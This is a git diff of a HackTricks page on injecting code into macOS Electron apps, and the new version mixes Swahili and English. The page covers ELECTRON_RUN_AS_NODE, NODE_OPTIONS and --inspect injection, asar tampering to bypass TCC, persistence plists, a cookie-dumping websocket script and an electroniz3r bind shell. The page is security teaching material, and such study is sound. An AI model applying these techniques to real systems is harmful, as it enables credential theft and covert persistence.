@@ -1,42 +1,42 @@
-# Kuingiza Maombi ya Electron kwenye macOS
+# macOS Electron Applications Injection
 
 {% hint style="success" %}
-Jifunze & zoezi la Udukuzi wa AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Mafunzo ya HackTricks AWS Timu Nyekundu Mtaalam (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Jifunze & zoezi la Udukuzi wa GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Mafunzo ya HackTricks GCP Timu Nyekundu Mtaalam (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
 <summary>Support HackTricks</summary>
 
-* Angalia [**mpango wa michango**](https://github.com/sponsors/carlospolop)!
-* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Shiriki mbinu za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
 {% endhint %}
 
-## Taarifa Msingi
+## Basic Information
 
-Ikiwa haujui ni nini Electron, unaweza kupata [**mengi ya habari hapa**](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/xss-to-rce-electron-desktop-apps). Lakini kwa sasa jua tu kwamba Electron inaendesha **node**.\
-Na node ina **parameta** na **mazingira ya env** ambayo yanaweza kutumika **kuifanya iendeshe nambari nyingine** isipokuwa faili iliyotajwa.
+Ikiwa hujui ni nini Electron, unaweza kupata [**habari nyingi hapa**](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/xss-to-rce-electron-desktop-apps). Lakini kwa sasa jua tu kwamba Electron inatumia **node**.\
+Na node ina **parameta** na **env variables** ambazo zinaweza kutumika **kufanya itekeleze msimbo mwingine** mbali na faili iliyoonyeshwa.
 
-### Fyuzi za Electron
+### Electron Fuses
 
-Mbinu hizi zitajadiliwa baadaye, lakini hivi karibuni Electron imeongeza **bendera za usalama kadhaa kuzuia**. Hizi ni [**Fyuzi za Electron**](https://www.electronjs.org/docs/latest/tutorial/fuses) na hizi ndizo zinazotumiwa **kuzuia** programu za Electron kwenye macOS kutoka kwa **kupakia nambari za aina yoyote**:
+Mbinu hizi zitaelezewa baadaye, lakini katika nyakati za hivi karibuni Electron imeongeza **bendera za usalama kadhaa kuzuia hizo**. Hizi ni [**Electron Fuses**](https://www.electronjs.org/docs/latest/tutorial/fuses) na hizi ndizo zinazotumika **kuzuia** programu za Electron katika macOS **kuchukua msimbo usio na mpangilio**:
 
-* **`RunAsNode`**: Ikiwa imelemazwa, inazuia matumizi ya mazingira ya env **`ELECTRON_RUN_AS_NODE`** kuingiza nambari.
-* **`EnableNodeCliInspectArguments`**: Ikiwa imelemazwa, parameta kama `--inspect`, `--inspect-brk` haitaheshimiwa. Kuepuka njia hii ya kuingiza nambari.
-* **`EnableEmbeddedAsarIntegrityValidation`**: Ikiwa imewezeshwa, faili iliyopakiwa **`asar`** itathibitishwa na macOS. **Kuzuia** njia hii ya **kuingiza nambari** kwa kubadilisha maudhui ya faili hii.
-* **`OnlyLoadAppFromAsar`**: Ikiwa hii imelemazwa, badala ya kutafuta kupakia kwa mpangilio ufuatao: **`app.asar`**, **`app`** na hatimaye **`default_app.asar`**. Itachunguza na kutumia app.asar tu, hivyo kuhakikisha kwamba wakati **unachanganya** na **`embeddedAsarIntegrityValidation`** fyuzi ni **haiwezekani** kwa **kupakia nambari isiyothibitishwa**.
-* **`LoadBrowserProcessSpecificV8Snapshot`**: Ikiwa imewezeshwa, mchakato wa kivinjari hutumia faili inayoitwa `browser_v8_context_snapshot.bin` kwa picha yake ya V8.
+* **`RunAsNode`**: Ikiwa imezimwa, inazuia matumizi ya env var **`ELECTRON_RUN_AS_NODE`** kuingiza msimbo.
+* **`EnableNodeCliInspectArguments`**: Ikiwa imezimwa, parameta kama `--inspect`, `--inspect-brk` hazitazingatiwa. Inazuia njia hii kuingiza msimbo.
+* **`EnableEmbeddedAsarIntegrityValidation`**: Ikiwa imewezeshwa, **`asar`** **faili** iliyopakiwa itathibitishwa na macOS. **Inazuia** njia hii **kuingiza msimbo** kwa kubadilisha maudhui ya faili hii.
+* **`OnlyLoadAppFromAsar`**: Ikiwa hii imewezeshwa, badala ya kutafuta kupakia kwa mpangilio ufuatao: **`app.asar`**, **`app`** na hatimaye **`default_app.asar`**. Itakagua tu na kutumia app.asar, hivyo kuhakikisha kwamba wakati **imeunganishwa** na **`embeddedAsarIntegrityValidation`** fuse haiwezekani **kuchukua msimbo usio thibitishwa**.
+* **`LoadBrowserProcessSpecificV8Snapshot`**: Ikiwa imewezeshwa, mchakato wa kivinjari unatumia faili inayoitwa `browser_v8_context_snapshot.bin` kwa ajili ya snapshot yake ya V8.
 
-Fyuzi nyingine ya kuvutia ambayo haitazuia kuingiza nambari ni:
+Fuse nyingine ya kuvutia ambayo haitazuia kuingiza msimbo ni:
 
-* **EnableCookieEncryption**: Ikiwa imewezeshwa, hifadhi ya kuki kwenye diski inafanywa kuwa imefichwa kwa kutumia funguo za kriptografia za ngazi ya OS.
+* **EnableCookieEncryption**: Ikiwa imewezeshwa, duka la kuki kwenye diski linachakatwa kwa kutumia funguo za cryptography za kiwango cha OS.
 
-### Kuangalia Fyuzi za Electron
+### Checking Electron Fuses
 
-Unaweza **kuangalia bendera hizi** kutoka kwa programu na:
+Unaweza **kuangalia bendera hizi** kutoka kwa programu kwa:
 ```bash
 npx @electron/fuses read --app /Applications/Slack.app
 
@@ -50,47 +50,49 @@ EnableEmbeddedAsarIntegrityValidation is Enabled
 OnlyLoadAppFromAsar is Enabled
 LoadBrowserProcessSpecificV8Snapshot is Disabled
 ```
-### Kubadilisha Fyuzi za Electron
+### Kubadilisha Fuse za Electron
 
-Kama [**nyaraka zinavyosema**](https://www.electronjs.org/docs/latest/tutorial/fuses#runasnode), usanidi wa **Fyuzi za Electron** umesanidiwa ndani ya **binary ya Electron** ambayo ina mahali fulani string **`dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX`**.
+Kama [**nyaraka zinavyosema**](https://www.electronjs.org/docs/latest/tutorial/fuses#runasnode), usanidi wa **Fuse za Electron** umewekwa ndani ya **Electron binary** ambayo ina mahali fulani mfuatano wa herufi **`dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX`**.
 
-Katika programu za macOS hii kawaida iko katika `application.app/Contents/Frameworks/Electron Framework.framework/Electron Framework`
+Katika programu za macOS hii kwa kawaida iko katika `application.app/Contents/Frameworks/Electron Framework.framework/Electron Framework`
 ```bash
 grep -R "dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX" Slack.app/
 Binary file Slack.app//Contents/Frameworks/Electron Framework.framework/Versions/A/Electron Framework matches
 ```
-Ungepata faili hii katika [https://hexed.it/](https://hexed.it/) na kutafuta neno lililopita. Baada ya neno hilo unaweza kuona nambari "0" au "1" ikionyesha ikiwa kila firimbi imelemazwa au kuwezeshwa. Badilisha nambari ya hex (`0x30` ni `0` na `0x31` ni `1`) ili **kubadilisha thamani za firimbi**.
+You could load this file in [https://hexed.it/](https://hexed.it/) and search for the previous string. After this string you can see in ASCII a number "0" or "1" indicating if each fuse is disabled or enabled. Just modify the hex code (`0x30` is `0` and `0x31` is `1`) to **modify the fuse values**.
 
 <figure><img src="../../../.gitbook/assets/image (34).png" alt=""><figcaption></figcaption></figure>
 
-Tafadhali kumbuka kwamba ukijaribu **kubadilisha** **`Electron Framework` binary** ndani ya programu na byte hizi zilizobadilishwa, programu haitaendeshwa.
+Note that if you try to **overwrite** the **`Electron Framework` binary** inside an application with these bytes modified, the app won't run.
 
-## RCE kuongeza nambari kwa Programu za Electron
+## RCE adding code to Electron Applications
 
-Kuna **faili za JS/HTML za nje** ambazo Programu ya Electron inatumia, hivyo mshambuliaji anaweza kuingiza nambari katika faili hizi ambazo saini yake haitachunguzwa na kutekeleza nambari ya kupendelea katika muktadha wa programu.
+There could be **external JS/HTML files** that an Electron App is using, so an attacker could inject code in these files whose signature won't be checked and execute arbitrary code in the context of the app.
 
 {% hint style="danger" %}
-Hata hivyo, kwa sasa kuna vizuizi 2:
+However, at the moment there are 2 limitations:
 
-* Ruhusa ya **`kTCCServiceSystemPolicyAppBundles`** inahitajika kubadilisha Programu, hivyo kwa chaguo-msingi hili sio jambo linalowezekana tena.
-* Faili iliyokompiliwa ya **`asap`** kawaida ina fuses **`embeddedAsarIntegrityValidation`** `na` **`onlyLoadAppFromAsar`** `kuwezeshwa`
+* The **`kTCCServiceSystemPolicyAppBundles`** permission is **needed** to modify an App, so by default this is no longer possible.
+* The compiled **`asap`** file usually has the fuses **`embeddedAsarIntegrityValidation`** `and` **`onlyLoadAppFromAsar`** `enabled`
 
-Hii inafanya njia hii ya shambulio kuwa ngumu zaidi (au haiwezekani).
+Making this attack path more complicated (or impossible).
 {% endhint %}
 
-Kumbuka kwamba inawezekana kukiuka mahitaji ya **`kTCCServiceSystemPolicyAppBundles`** kwa kunakili programu kwenye saraka nyingine (kama **`/tmp`**), kubadilisha jina la folda **`app.app/Contents`** kuwa **`app.app/NotCon`**, **kubadilisha** faili ya **asar** na nambari yako **inayodhuru**, kuirudisha jina kuwa **`app.app/Contents`** na kuitekeleza.
+Note that it's possible to bypass the requirement of **`kTCCServiceSystemPolicyAppBundles`** by copying the application to another directory (like **`/tmp`**), renaming the folder **`app.app/Contents`** to **`app.app/NotCon`**, **modifying** the **asar** file with your **malicious** code, renaming it back to **`app.app/Contents`** and executing it.
 
-Unaweza kufungua nambari kutoka kwa faili ya asar na:
+You can unpack the code from the asar file with:
 ```bash
 npx asar extract app.asar app-decomp
 ```
-Na pakia tena baada ya kuirudisha baada ya kuibadilisha na:
+Na uifunge tena baada ya kuibadilisha kwa:
 ```bash
 npx asar pack app-decomp app-new.asar
 ```
 ## RCE na `ELECTRON_RUN_AS_NODE` <a href="#electron_run_as_node" id="electron_run_as_node"></a>
 
 Kulingana na [**nyaraka**](https://www.electronjs.org/docs/latest/api/environment-variables#electron\_run\_as\_node), ikiwa hii variable ya mazingira imewekwa, itaanzisha mchakato kama mchakato wa kawaida wa Node.js.
+
+{% code overflow="wrap" %}
 ```bash
 # Run this
 ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
@@ -100,12 +102,12 @@ require('child_process').execSync('/System/Applications/Calculator.app/Contents/
 {% endcode %}
 
 {% hint style="danger" %}
-Ikiwa fuse **`RunAsNode`** imelemazwa, env var **`ELECTRON_RUN_AS_NODE`** itapuuzwa, na hii haitafanya kazi.
+Ikiwa fuse **`RunAsNode`** imezimwa, mabadiliko ya env **`ELECTRON_RUN_AS_NODE`** yataachwa bila kutumika, na hii haitafanya kazi.
 {% endhint %}
 
 ### Uingizaji kutoka kwa App Plist
 
-Kama [**ilivyopendekezwa hapa**](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks/), unaweza kutumia vibaya hii env variable katika plist kudumisha uthabiti:
+Kama [**ilivyopendekezwa hapa**](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks/), unaweza kutumia mabadiliko haya ya env katika plist ili kudumisha uvumilivu:
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
@@ -131,7 +133,7 @@ Kama [**ilivyopendekezwa hapa**](https://www.trustedsec.com/blog/macos-injection
 ```
 ## RCE na `NODE_OPTIONS`
 
-Unaweza kuhifadhi mzigo kwenye faili tofauti na kuutekeleza:
+Unaweza kuhifadhi payload katika faili tofauti na kuitekeleza:
 
 {% code overflow="wrap" %}
 ```bash
@@ -144,14 +146,14 @@ NODE_OPTIONS="--require /tmp/payload.js" ELECTRON_RUN_AS_NODE=1 /Applications/Di
 {% endcode %}
 
 {% hint style="danger" %}
-Ikiwa kifungu cha **`EnableNodeOptionsEnvironmentVariable`** kimelemazwa, programu ita**puuza** var ya mazingira **NODE\_OPTIONS** wakati inapoanzishwa isipokuwa ikiwa var ya mazingira **`ELECTRON_RUN_AS_NODE`** imewekwa, ambayo itakuwa pia **puuziwa** ikiwa kifungu cha **`RunAsNode`** kimelemazwa.
+Ikiwa fuse **`EnableNodeOptionsEnvironmentVariable`** ime **zimwa**, programu itakuwa **ipuuze** env var **NODE\_OPTIONS** inapozinduliwa isipokuwa env variable **`ELECTRON_RUN_AS_NODE`** imewekwa, ambayo pia itapuuziliwa mbali ikiwa fuse **`RunAsNode`** imezimwa.
 
-Ikiwa haujaweka **`ELECTRON_RUN_AS_NODE`**, utapata **kosa**: `Most NODE_OPTIONs are not supported in packaged apps. See documentation for more details.`
+Ikiwa hujaweka **`ELECTRON_RUN_AS_NODE`**, utaona **kosa**: `Most NODE_OPTIONs are not supported in packaged apps. See documentation for more details.`
 {% endhint %}
 
-### Uingizaji kutoka kwa Plist ya Programu
+### Uingizaji kutoka kwa App Plist
 
-Unaweza kutumia vibaya var ya mazingira hii katika plist kudumisha uthabiti kwa kuongeza funguo hizi:
+Unaweza kutumia env variable hii katika plist ili kudumisha kudumu kwa kuongeza funguo hizi:
 ```xml
 <dict>
 <key>EnvironmentVariables</key>
@@ -169,8 +171,10 @@ Unaweza kutumia vibaya var ya mazingira hii katika plist kudumisha uthabiti kwa 
 ```
 ## RCE na ukaguzi
 
-Kulingana na [**hii**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f), ikiwa unatekeleza programu ya Electron na bendera kama vile **`--inspect`**, **`--inspect-brk`** na **`--remote-debugging-port`**, **bandari ya ukaguzi itafunguliwa** ili uweze kuunganisha (kwa mfano kutoka Chrome kwenye `chrome://inspect`) na utaweza **kuingiza namna ya kanuni** au hata kuzindua michakato mipya.\
-Kwa mfano:
+Kulingana na [**hii**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f), ukitekeleza programu ya Electron kwa bendera kama **`--inspect`**, **`--inspect-brk`** na **`--remote-debugging-port`**, **bandari ya ufuatiliaji itafunguliwa** ili uweze kuungana nayo (kwa mfano kutoka Chrome katika `chrome://inspect`) na utaweza **kuingiza msimbo ndani yake** au hata kuzindua michakato mipya.\
+Kwa mfano: 
+
+{% code overflow="wrap" %}
 ```bash
 /Applications/Signal.app/Contents/MacOS/Signal --inspect=9229
 # Connect to it using chrome://inspect and execute a calculator with:
@@ -179,14 +183,14 @@ require('child_process').execSync('/System/Applications/Calculator.app/Contents/
 {% endcode %}
 
 {% hint style="danger" %}
-Ikiwa fuse **`EnableNodeCliInspectArguments`** imelemazwa, programu ita**puuza parameta za node** (kama vile `--inspect`) wakati inapoanzishwa isipokuwa ikiwa mazingira ya env **`ELECTRON_RUN_AS_NODE`** yameset, ambayo itapuuzwa pia ikiwa fuse **`RunAsNode`** imelemazwa.
+Ikiwa fuse **`EnableNodeCliInspectArguments`** imezimwa, programu itakuwa **ikiweka kando vigezo vya node** (kama `--inspect`) inapozinduliwa isipokuwa variable ya env **`ELECTRON_RUN_AS_NODE`** imewekwa, ambayo pia itakuwa **ikiwekwa kando** ikiwa fuse **`RunAsNode`** imezimwa.
 
-Hata hivyo, bado unaweza kutumia **paramu ya electron `--remote-debugging-port=9229`** lakini mzigo uliopita hautafanya kazi ya kutekeleza michakato mingine.
+Hata hivyo, unaweza bado kutumia **paramu ya electron `--remote-debugging-port=9229`** lakini payload ya awali haitafanya kazi kutekeleza michakato mingine.
 {% endhint %}
 
-Kwa kutumia paramu **`--remote-debugging-port=9222`** niwezekanavyo kuiba baadhi ya taarifa kutoka kwa Programu ya Electron kama **historia** (na amri za GET) au **vidakuzi** vya kivinjari (kwani vime**fichuliwa** ndani ya kivinjari na kuna **kituo cha json** kitakachowapa).
+Kwa kutumia paramu **`--remote-debugging-port=9222`** inawezekana kuiba baadhi ya taarifa kutoka kwa Programu ya Electron kama **historia** (kwa amri za GET) au **cookies** za kivinjari (kama zinavyokuwa **zimefichuliwa** ndani ya kivinjari na kuna **json endpoint** ambayo itawapa).
 
-Unaweza kujifunza jinsi ya kufanya hivyo [**hapa**](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e) na [**hapa**](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f) na kutumia zana ya moja kwa moja [WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut) au script rahisi kama:
+Unaweza kujifunza jinsi ya kufanya hivyo [**hapa**](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e) na [**hapa**](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f) na kutumia chombo cha kiotomatiki [WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut) au script rahisi kama:
 ```python
 import websocket
 ws = websocket.WebSocket()
@@ -194,11 +198,11 @@ ws.connect("ws://localhost:9222/devtools/page/85976D59050BFEFDBA48204E3D865D00",
 ws.send('{\"id\": 1, \"method\": \"Network.getAllCookies\"}')
 print(ws.recv()
 ```
-Katika [**chapisho hili la blogi**](https://hackerone.com/reports/1274695), hii uchunguzi wa kosa la programu unatumika kufanya kivuli cha chrome **kupakua faili za aina yoyote kwenye maeneo ya aina yoyote**.
+Katika [**hiki blogu**](https://hackerone.com/reports/1274695), urekebishaji huu unatumika vibaya kufanya chrome isiyo na kichwa **kupakua faili zisizo na mpangilio katika maeneo yasiyo na mpangilio**.
 
-### Uingizaji kutoka kwa Plist ya Programu
+### Uingizaji kutoka kwa App Plist
 
-Unaweza kutumia mazingira haya ya mazingira katika plist kudumisha uthabiti kwa kuongeza funguo hizi:
+Unaweza kutumia vibaya hii env variable katika plist ili kudumisha kudumu kwa kuongeza funguo hizi:
 ```xml
 <dict>
 <key>ProgramArguments</key>
@@ -212,22 +216,22 @@ Unaweza kutumia mazingira haya ya mazingira katika plist kudumisha uthabiti kwa 
 <true/>
 </dict>
 ```
-## Kukwepa TCC kwa Kutumia Toleo za Zamani
+## TCC Bypass abusing Older Versions
 
 {% hint style="success" %}
-Mnyama wa TCC kutoka macOS hachunguzi toleo lililotekelezwa la programu. Kwa hivyo, ikiwa huwezi **kuingiza namna ya kanuni katika programu ya Electron** kwa njia yoyote ya awali unaweza kupakua toleo la hapo awali la APP na kuingiza namna ya kanuni ndani yake kwani bado itapata ruhusa za TCC (isipokuwa Cache ya Imani inazuia hilo).
+Daemoni wa TCC kutoka macOS hauangalii toleo lililotekelezwa la programu. Hivyo kama huwezi **kuiingiza msimbo katika programu ya Electron** kwa kutumia mbinu zozote za awali unaweza kupakua toleo la awali la APP na kuingiza msimbo ndani yake kwani bado itapata ruhusa za TCC (isipokuwa Trust Cache iizuie).
 {% endhint %}
 
-## Tekeleza Kanuni Isiyo ya JS
+## Run non JS Code
 
-Njia za awali zitaruhusu kuendesha **kanuni ya JS ndani ya mchakato wa programu ya electron**. Walakini, kumbuka kwamba **mchakato wa watoto hufanya kazi chini ya wasifu sawa wa sanduku la mchanga** kama programu mama na **kurithi ruhusa zao za TCC**.\
-Kwa hivyo, ikiwa unataka kutumia vibali kufikia kamera au mikrofoni kwa mfano, unaweza tu **kuendesha binary nyingine kutoka kwa mchakato**.
+Mbinu za awali zitakuruhusu kuendesha **msimbo wa JS ndani ya mchakato wa programu ya electron**. Hata hivyo, kumbuka kwamba **michakato ya watoto inakimbia chini ya wasifu sawa wa sandbox** kama programu ya mzazi na **inapata ruhusa zao za TCC**.\
+Hivyo, ikiwa unataka kutumia haki za kuingia ili kufikia kamera au kipaza sauti kwa mfano, unaweza tu **kuendesha binary nyingine kutoka kwa mchakato**.
 
-## Kuingiza Kiotomatiki
+## Automatic Injection
 
-Zana [**electroniz3r**](https://github.com/r3ggi/electroniz3r) inaweza kutumika kwa urahisi **kupata programu za Electron zilizo na mapungufu** zilizosanikishwa na kuingiza namna ya kanuni ndani yake. Zana hii itajaribu kutumia mbinu ya **`--inspect`**:
+Zana [**electroniz3r**](https://github.com/r3ggi/electroniz3r) inaweza kutumika kwa urahisi ili **kupata programu za electron zenye udhaifu** zilizowekwa na kuingiza msimbo ndani yao. Zana hii itajaribu kutumia mbinu ya **`--inspect`**:
 
-Unahitaji kuikusanya mwenyewe na unaweza kuitumia kama hivi:
+Unahitaji kuikamilisha mwenyewe na unaweza kuitumia kama hii:
 ```bash
 # Find electron apps
 ./electroniz3r list-apps
@@ -270,16 +274,16 @@ Shell binding requested. Check `nc 127.0.0.1 12345`
 * [https://m.youtube.com/watch?v=VWQY5R2A6X8](https://m.youtube.com/watch?v=VWQY5R2A6X8)
 
 {% hint style="success" %}
-Jifunze na zoezi la Udukuzi wa AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Mafunzo ya HackTricks AWS Timu Nyekundu Mtaalam (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Jifunze na zoezi la Udukuzi wa GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Mafunzo ya HackTricks GCP Timu Nyekundu Mtaalam (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Jifunze & fanya mazoezi ya AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Jifunze & fanya mazoezi ya GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
 <summary>Support HackTricks</summary>
 
-* Angalia [**mpango wa michango**](https://github.com/sponsors/carlospolop)!
-* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Shiriki mbinu za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.
+* Angalia [**mpango wa usajili**](https://github.com/sponsors/carlospolop)!
+* **Jiunge na** 💬 [**kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuatilie** kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Shiriki mbinu za hacking kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.
 
 </details>
 {% endhint %}
